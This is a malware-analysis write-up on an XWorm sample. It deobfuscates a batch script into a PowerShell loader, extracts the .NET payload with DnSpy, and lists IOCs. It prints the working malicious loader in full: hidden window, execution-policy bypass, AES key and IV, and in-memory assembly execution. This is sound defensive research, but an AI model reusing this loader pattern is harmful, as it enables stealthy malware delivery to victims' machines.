## XWorm - Batch Deobfuscation - .NET Loader

This sample starts off with some batch & PowerShell deobfuscation, revealing a .NET loader which we can debug using DnSpy and module breakpoints to reveal the payload.

SHA 256: e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f

## Initial Batch Script

This sample starts with an obfuscated batch script which looks like the following:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/15a2ff27-e269-40d7-96fc-586d9093245b)

From the fourth line onward we can see that many set commands are taking place, we also see a lot of commented-out strings which don't seem to make a lot of sense right now, denoted by the ::

Towards the end of the script, it appears that those variables are being called and executed:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/56b8f863-19b1-42db-951a-7bfcd968584e)

A quick way to make sense of this script is by commenting out the lines that clear the terminal and exit, and adding "echo" commands before the variables are called.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/be36953d-e183-4e48-9ff8-f861c071a512)

Now if we execute this new script, we get the following:

``` powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')
('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine);foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4); break; }; };$_CASH_tFaoL =
[System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '');$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL);$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged;$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC;$_CASH_pFavC.Padding =
[System.Security.Cryptography.PaddingMode]::PKCS7;$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=');$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==');$_CASH_traoF =
$_CASH_pFavC.CreateDecryptor();$_CASH_epUJg = $_CASH_traoF.TransformFinalBlock($_CASH_epUJg, 0, $_CASH_epUJg.Length);$_CASH_traoF.Dispose();$_CASH_pFavC.Dispose();$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg);$_CASH_DLltN = New-Object System.IO.MemoryStream;$_CASH_VzeZp = New-Object
System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress);$_CASH_VzeZp.CopyTo($_CASH_DLltN);$_CASH_VzeZp.Dispose();$_CASH_SjOoQ.Dispose();$_CASH_DLltN.Dispose();$_CASH_epUJg = $_CASH_DLltN.ToArray();$_CASH_JzGOp = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')
($_CASH_epUJg);$_CASH_PUHAS = $_CASH_JzGOp.EntryPoint;$_CASH_PUHAS.Invoke($null, (, [string[]] ('')))
```
We can make this a bit easier to read by replacing all semi-colons with new lines:

```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine)
foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4)
 break
 }
 }
$_CASH_tFaoL = [System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '')
$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL)
$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged
$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC
$_CASH_pFavC.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=')
$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==')
$_CASH_traoF = $_CASH_pFavC.CreateDecryptor()
$_CASH_epUJg = $_CASH_traoF.TransformFinalBlock($_CASH_epUJg, 0, $_CASH_epUJg.Length)
$_CASH_traoF.Dispose()
$_CASH_pFavC.Dispose()
$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg)
$_CASH_DLltN = New-Object System.IO.MemoryStream
$_CASH_VzeZp = New-Object System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress)
$_CASH_VzeZp.CopyTo($_CASH_DLltN)
$_CASH_VzeZp.Dispose()
$_CASH_SjOoQ.Dispose()
$_CASH_DLltN.Dispose()
$_CASH_epUJg = $_CASH_DLltN.ToArray()
$_CASH_JzGOp = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($_CASH_epUJg)
$_CASH_PUHAS = $_CASH_JzGOp.EntryPoint
$_CASH_PUHAS.Invoke($null, (, [string[]] ('')))
```

**Command Line Breakdown:**
```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
cd "C:\Users\mzheader\Desktop\"
```
It appears that the script is firstly copying PowerShell and moving it to the same directory & filename as the executed script, changing directory to that directory, and executing the newly copied binary of PowerShell.
```powershell
"e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')
('C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat').Split([Environment]::NewLine)
```
A command is executed, with the reversed string of "ReadAllText" and it reads the initial batch script.
```powershell
foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4)
```
From the initial script, it is looking for instances that start with ":: @" and takes everything from the 4th substring onwards, ie, all the content after the "::@"
The result is being saved as variable name "_CASH_tFaoL"
```powershell
$_CASH_tFaoL = [System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '')
```
The contents of _CASH_tFaoL is read, and all instances of "_CASH_" are replaced with nothing.
```powershell
$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL)
```
The string is decoded from Base64.
```powershell
$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged
$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC
$_CASH_pFavC.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=')
$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==')
```
The decoded text is being AES-decrypted with Key "GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=" and IV "5IgM8xAuhLV8mV1KzrCEvg==".
```powershell
$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg)
$_CASH_DLltN = New-Object System.IO.MemoryStream
$_CASH_VzeZp = New-Object System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress)
```
The decrypted text is being decompressed with gunzip.
```powershell
$_CASH_JzGOp = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($_CASH_epUJg)
$_CASH_PUHAS = $_CASH_JzGOp.EntryPoint
$_CASH_PUHAS.Invoke($null, (, [string[]] ('')))
```
The contents of which are being loaded/executed in memory.

Now that we know what the script is doing, we'll search for instances of "::@" in the initial script, perform the operations and we should be left with some form of executable code.

We see our string starting with "::@", which is a huge blob of text.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d8d60598-7491-4893-8892-2d4d563c8206)

We'll take this blob and throw it in CyberChef with the following operators to decode and decrypt the content as the script does.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d45309f5-a055-4251-b051-96766c3050b3)

We are left with an executable file.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0b251516-6528-43ff-b54a-ced8d90e169f)

## .NET Analysis

Detect It Easy tells us that this is a .NET binary, and it has a fairly interesting entropy level, around mid-way but it remains consistent.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c6ef6c1c-b1dd-4fdc-85d8-f9a6ed669266)

Loading the executable into DnSpy we can see it is heavily obfuscated, but there are references to LoadPE. This, and the level of entropy suggests it's likely a loader and not our final payload.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/23ac0071-6c6b-4f02-b400-45a40b3ab74e)

Knowing this, we can set a module breakpoint and try to extract anything interesting that is being loaded in memory.

Head to Module Breakpoints and set a breakpoint for * (anything)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/31865716-bb47-45d9-aabb-332c2cc0f323)

Now we begin to debug the executable, taking note of all loaded modules.

As we step through, there is a very interesting module being loaded which we should interrogate further.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b4c94a3e-5255-4d35-b37c-b36ba64ba74e)

We can right-click "Load Module" to decompile it in our current DnSpy session.

This module doesn't appear to be obfuscated and we can instantly see where the Settings are stored.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9e5f87ea-7e84-4d94-8ad4-16fef0a92b75)

**Settings:**

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9b67b4f1-e3a9-4684-9cc1-009723118aff)


IOCs:
IPv4: 65.1.224[.]214
SHA 256: E5DAC6F6D2AB4C479C5C3E91064F335DE141C8399BD93F8267E13F134C578C0F
SHA 256: EC7890D7D688DAC4EF8EF6B6E2A832280EA47BF404B851B97CDF7C709C389E65
SHA 256: CBB7FC940A1E9B3DADB1EC625554325B5DD9A95E34A05A0EC6F7206D2128DAB9








